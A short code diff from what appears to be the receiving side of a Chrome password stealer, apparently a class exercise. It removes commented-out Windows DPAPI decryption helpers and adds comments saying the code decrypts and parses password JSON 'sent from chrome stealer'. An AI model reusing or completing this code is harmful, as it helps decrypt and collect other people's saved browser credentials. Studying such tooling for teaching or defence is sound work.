@@ -6,42 +6,7 @@ import shutil
 from datetime import timezone, datetime, timedelta
 import json
 
-"""
-def get_data(blob_out):
-    # Source:
-    # https://github.com/jsternberg/waf/blob/master/waflib/extras/dpapi.py
-    cbData = int(blob_out.cbData)
-    pbData = blob_out.pbData
-    buffer = c_buffer(cbData)
-    memcpy(buffer, pbData, cbData)
-    LocalFree(pbData)
-    return buffer.raw
-
-#CryptUnprotectData = windll.crypt32.CryptUnprotectData
-#LocalFree = windll.kernel32.LocalFree
-#memcpy = cdll.msvcrt.memcpy
-
-class DATA_BLOB(Structure):
-    _fields_ = [
-        ('cbData', DWORD),
-        ('pbData', POINTER(c_char))
-    ]
-
-def decrypt_data_dpapi(encrypted_bytes):
-    # Source:
-    # https://github.com/jsternberg/waf/blob/master/waflib/extras/dpapi.py
-    entropy = b""
-    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
-    buffer_entropy = c_buffer(entropy, len(entropy))
-    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
-    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
-    blob_out = DATA_BLOB()
-    if CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None,
-                          None, None, byref(blob_out)):
-        return get_data(blob_out)
-    print("[!] Decryption Failed")
-    return -1
-"""
+#taken from sample class code
 def decrypt_password(encrypted_password, key):
     try:
         #print(encrypted_password)
@@ -69,7 +34,7 @@ def decrypt_password(encrypted_password, key):
         # in that case, you can just directly call the DPAPI
        
 
-
+#will parse the passwords json sent from chrome stealer
 def newParseJSON(json_res):
 
     response_data = json_res.get('response_data')
